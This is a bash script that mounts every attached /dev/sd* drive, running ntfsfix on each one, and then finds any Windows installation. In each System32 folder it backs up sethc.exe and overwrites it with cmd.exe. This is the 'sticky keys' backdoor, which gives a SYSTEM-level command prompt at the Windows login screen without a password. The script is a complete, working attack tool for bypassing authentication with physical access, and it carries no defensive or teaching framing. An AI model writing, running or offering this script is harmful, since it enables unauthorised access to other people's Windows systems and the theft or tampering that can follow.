#!/bin/bash

# Run the script with elevated privileges
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit
fi

echo "Starting script..."

# Check if ntfsfix is installed, and install it if necessary
if ! command -v ntfsfix &> /dev/null; then
    echo "ntfsfix could not be found. Installing ntfs-3g..."
    if [ -x "$(command -v apt)" ]; then
        sudo apt update
        sudo apt install -y ntfs-3g
    elif [ -x "$(command -v dnf)" ]; then
        sudo dnf install -y ntfs-3g
    elif [ -x "$(command -v pacman)" ]; then
        sudo pacman -S --noconfirm ntfs-3g
    else
        echo "Unsupported package manager. Please install ntfs-3g manually."
        exit 1
    fi
fi

# Mount all drives (assuming drives are /dev/sd* and mount points are /mnt/sd*)
for drive in /dev/sd*; do
    if [ -b "$drive" ]; then
        mount_point="/mnt/$(basename $drive)"
        mkdir -p "$mount_point"
        echo "Running ntfsfix on $drive..."
        ntfsfix "$drive"
        echo "Mounting $drive at $mount_point..."
        mount "$drive" "$mount_point" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "Mounted $drive at $mount_point"
        else
            echo "Failed to mount $drive"
        fi
    else
        echo "$drive is not a block device"
    fi
done

echo "Finished mounting drives..."

# Scan for /Windows/System32 folder and perform operations
for mount_point in /mnt/*; do
    if [ -d "$mount_point/Windows/System32" ]; then
        echo "Found /Windows/System32 at $mount_point"
        cd "$mount_point/Windows/System32"
        if [ $? -eq 0 ]; then
            echo "Navigated to $mount_point/Windows/System32"
            echo "Copying sethc.exe to sethc_2.exe..."
            cp sethc.exe sethc_2.exe
            if [ $? -eq 0 ]; then
                echo "Copied sethc.exe to sethc_2.exe successfully"
            else
                echo "Failed to copy sethc.exe to sethc_2.exe"
            fi
            echo "Replacing sethc.exe with cmd.exe..."
            cp cmd.exe sethc.exe
            if [ $? -eq 0 ]; then
                echo "Replaced sethc.exe with cmd.exe successfully"
            else
                echo "Failed to replace sethc.exe with cmd.exe"
            fi
        else
            echo "Failed to navigate to $mount_point/Windows/System32"
        fi
    else
        echo "/Windows/System32 not found at $mount_point"
    fi
done

echo "Script completed."
